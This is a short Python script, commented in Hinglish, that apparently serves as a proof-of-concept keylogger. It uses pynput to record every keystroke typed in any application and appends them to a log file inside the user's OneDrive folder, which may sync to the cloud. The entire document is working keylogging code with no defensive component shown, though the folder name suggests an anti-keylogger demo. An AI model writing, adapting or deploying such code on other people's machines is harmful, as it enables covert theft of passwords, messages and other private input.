import os
from pynput import keyboard

# Sahi aur explicit absolute path set karna OneDrive folder ke andar
LOG_FILE_PATH = os.path.join(os.path.expanduser("~"), "OneDrive", "anti_keylog", "demo_log.txt")

def on_press(key):
    try:
        # File open karke append mode mein write karna
        with open(LOG_FILE_PATH, "a", encoding="utf-8") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE_PATH, "a", encoding="utf-8") as f:
            f.write(f" [{key}] ")
    except PermissionError:
        # Agar permissions ka koi temporary clash ho toh crash hone se bachana
        pass

print(f"[*] PoC Keylogger Active. Logs are saving directly to:\n    {LOG_FILE_PATH}")
print("[*] Start typing anywhere (Notepad, browser etc.)...")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()